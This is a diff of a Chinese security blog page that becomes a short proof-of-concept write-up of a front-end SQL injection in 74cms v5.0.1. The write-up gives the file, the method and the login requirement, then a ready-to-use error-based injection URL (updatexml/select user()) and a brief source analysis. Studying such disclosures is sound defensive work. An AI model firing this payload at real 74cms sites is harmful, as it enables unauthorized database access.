@@ -23,16 +23,25 @@
     var NexT = window.NexT || {};
     var CONFIG = {"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","version":"8.2.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}};
   </script>
-<meta property="og:type" content="website">
-<meta property="og:title" content="隐秘行动">
-<meta property="og:url" content="http://example.com/archives/2021/01/index.html">
+<meta name="description" content="74cms v5.0.1 前台sql注入一、漏洞简介74cms 5.0.1 前台AjaxPersonalController.class.php存在SQL注入 二、漏洞影响三、复现过程具体信息文件位置：74cms\upload\Application\Home\Controller\AjaxPersonalController.class.php 方法：function company_focu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="74cms v5.0.1 前台sql注入">
+<meta property="og:url" content="http://example.com/2021/01/12/74cms%20v5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="隐秘行动">
+<meta property="og:description" content="74cms v5.0.1 前台sql注入一、漏洞简介74cms 5.0.1 前台AjaxPersonalController.class.php存在SQL注入 二、漏洞影响三、复现过程具体信息文件位置：74cms\upload\Application\Home\Controller\AjaxPersonalController.class.php 方法：function company_focu">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/resource/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId26.png">
+<meta property="og:image" content="http://example.com/resource/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId28.png">
+<meta property="og:image" content="http://example.com/resource/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId29.png">
+<meta property="article:published_time" content="2021-01-12T03:56:11.000Z">
+<meta property="article:modified_time" content="2021-01-12T08:30:06.792Z">
 <meta property="article:author" content="nicaishui">
+<meta property="article:tag" content="74cms">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/resource/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId26.png">
 
 
-<link rel="canonical" href="http://example.com/archives/2021/01/">
+<link rel="canonical" href="http://example.com/2021/01/12/74cms%20v5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/">
 
 
 <script class="page-configurations">
@@ -40,11 +49,11 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
-<title>归档 | 隐秘行动</title>
+<title>74cms v5.0.1 前台sql注入 | 隐秘行动</title>
   
 
 
@@ -169,7 +178,7 @@
 
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -182,6 +191,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#74cms-v5-0-1-%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">74cms v5.0.1 前台sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">一、漏洞简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D"><span class="nav-number">1.2.</span> <span class="nav-text">二、漏洞影响</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="nav-number">1.3.</span> <span class="nav-text">三、复现过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E4%BF%A1%E6%81%AF"><span class="nav-number">1.3.1.</span> <span class="nav-text">具体信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Payload"><span class="nav-number">1.3.2.</span> <span class="nav-text">Payload:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9A"><span class="nav-number">1.3.3.</span> <span class="nav-text">源码分析：</span></a></li></ol></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -249,232 +259,111 @@
 </noscript>
 
 
-    <div class="main-inner archive posts-collapse">
+    <div class="main-inner post posts-expand">
 
 
   
-  
-  
-  <div class="post-block">
-    <div class="post-content">
-      <div class="collection-title">
-        <span class="collection-header">嗯..! 目前共计 19 篇日志。 继续努力。</span>
-      </div>
 
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="nicaishui">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="隐秘行动">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          74cms v5.0.1 前台sql注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
       
-    <div class="collection-year">
-      <span class="collection-header">2021</span>
+
+      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：16:30:06" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Poc/" itemprop="url" rel="index"><span itemprop="name">Poc</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <a id="more"></a>
+<h1 id="74cms-v5-0-1-前台sql注入"><a href="#74cms-v5-0-1-前台sql注入" class="headerlink" title="74cms v5.0.1 前台sql注入"></a>74cms v5.0.1 前台sql注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>74cms 5.0.1 前台AjaxPersonalController.class.php存在SQL注入</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="具体信息"><a href="#具体信息" class="headerlink" title="具体信息"></a>具体信息</h3><p>文件位置：74cms\upload\Application\Home\Controller\AjaxPersonalController.class.php</p>
+<p>方法：function company_focus($company_id)</p>
+<p>是否需登录：需要</p>
+<p>登录权限：普通用户即可</p>
+<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload:"></a>Payload:</h3><pre><code>http://0-sec.org/74cms/5.0.1/upload/index.php?m=&amp;c=AjaxPersonal&amp;a=company_focus&amp;company_id[0]=match&amp;company_id[1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a</code></pre>
+<p><img src="/resource/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId26.png"></p>
+<h3 id="源码分析："><a href="#源码分析：" class="headerlink" title="源码分析："></a>源码分析：</h3><p>文件：74cms\upload\Application\Home\Controller\AjaxPersonalController.class.php</p>
+<p>company_focus<br>方法是参数化函数，$company_id参数是不经过I函数过滤的，所以只要where可以控制，那就可以注入</p>
+<p><img src="/resource/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId28.png"></p>
+<p>跟踪add_focus(),发现SQL语句参数外部都可以控制，导致了注入漏洞</p>
+<p><img src="/resource/74cmsv5.0.1%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId29.png"></p>
+
     </div>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2021-01-12T11:56:11+08:00"
-              content="2021-01-12">
-          01-12
-        </time>
-      </div>
+    
+    
+    
 
-      <div class="post-title">
-          <a class="post-title-link" href="/2021/01/12/(CVE-2015-5254)ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" itemprop="url">
-            <span itemprop="name">（CVE-2015-5254）ActiveMQ 反序列化漏洞</span>
-          </a>
-      </div>
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/74cms/" rel="tag"># 74cms</a>
+          </div>
 
-      
-    </header>
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/01/12/74cms%20v5.0.1%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81/" rel="prev" title="74cms v5.0.1远程执行代码">
+                  <i class="fa fa-chevron-left"></i> 74cms v5.0.1远程执行代码
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/01/12/74cms%20v4.2.3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" rel="next" title="74cms v4.2.3 任意文件删除">
+                  74cms v4.2.3 任意文件删除 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
   </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2021-01-12T11:56:11+08:00"
-              content="2021-01-12">
-          01-12
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2021/01/12/%E4%B8%93%E6%B3%A8%20APT%20%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%20-%20Micro8%20%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" itemprop="url">
-            <span itemprop="name">专注 APT 攻击与防御</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2021-01-12T11:56:11+08:00"
-              content="2021-01-12">
-          01-12
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2021/01/12/ActiveMQ%E7%89%A9%E7%90%86%E8%B7%AF%E5%BE%84%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" itemprop="url">
-            <span itemprop="name">ActiveMQ物理路径泄漏漏洞</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2021-01-12T11:56:11+08:00"
-              content="2021-01-12">
-          01-12
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2021/01/12/%EF%BC%88CVE-2015-1830%EF%BC%89ActiveMQ%20%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E5%AF%BC%E8%87%B4%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84rce/" itemprop="url">
-            <span itemprop="name">（CVE-2015-1830）ActiveMQ 路径遍历导致未经身份验证的rce</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2021-01-12T11:56:11+08:00"
-              content="2021-01-12">
-          01-12
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2021/01/12/%EF%BC%88CVE-2017-15709%EF%BC%89ActiveMQ%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" itemprop="url">
-            <span itemprop="name">（CVE-2017-15709）ActiveMQ 信息泄漏漏洞</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2021-01-12T11:56:11+08:00"
-              content="2021-01-12">
-          01-12
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2021/01/12/%EF%BC%88CVE-2016-3088%EF%BC%89ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/" itemprop="url">
-            <span itemprop="name">（CVE-2016-3088）ActiveMQ应用漏洞</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2021-01-12T11:56:11+08:00"
-              content="2021-01-12">
-          01-12
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2021/01/12/74cms%20v4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" itemprop="url">
-            <span itemprop="name">74cms v4.2.126-任意文件读取漏洞</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2021-01-12T11:56:11+08:00"
-              content="2021-01-12">
-          01-12
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2021/01/12/74cms%20v4.2.1%20-%20v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/" itemprop="url">
-            <span itemprop="name">74cms v4.2.1-v4.2.129-后台getshell漏洞</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2021-01-12T11:56:11+08:00"
-              content="2021-01-12">
-          01-12
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2021/01/12/74cms%20v4.2.126-%E9%80%9A%E6%9D%80sql%E6%B3%A8%E5%85%A5/" itemprop="url">
-            <span itemprop="name">74cms v4.2.126-通杀sql注入</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2021-01-12T11:56:11+08:00"
-              content="2021-01-12">
-          01-12
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/" itemprop="url">
-            <span itemprop="name">74cms v4.2.126-前台四处sql注入</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
+</div>
 
 
-    </div>
-  </div>
-  
-  
-  
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/archives/2021/01/page/2/">2</a><a class="extend next" rel="next" href="/archives/2021/01/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
-  </nav>
+
+
+
 
 
 <script>
